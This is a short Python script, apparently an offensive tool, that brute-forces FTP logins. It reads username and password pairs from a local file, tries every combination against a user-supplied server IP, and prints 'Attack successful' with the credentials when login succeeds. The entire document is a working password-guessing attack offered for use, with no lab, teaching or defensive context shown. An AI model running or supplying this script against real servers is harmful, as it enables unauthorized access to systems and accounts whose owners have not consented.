from ftplib import FTP
import ftplib
file = open("file.txt")
f = file.read().split("\n")
ip = input("Enter server IP \n")
c = 0
pa = []
for i in f:
    p = i.split()
    pa.append(p[1])
for i in f:
    u = i.split()[0]
    for j in pa:
        try:
            server = FTP(ip)
            print("[*] Trying to connect")
            s = server.login(u, j)
            # print(s)
            if "230" in s:
                print(s)
                c = 1
                print("[*]Attack successful \n user : {} \n password : {}".format(u, j))
                break
            server.quit()
        except ftplib.all_errors as e:
            print("Can't BruteForce with user '{}' and password '{}'".format(u, j))
            pass
    if c == 1:
        break
file.close()
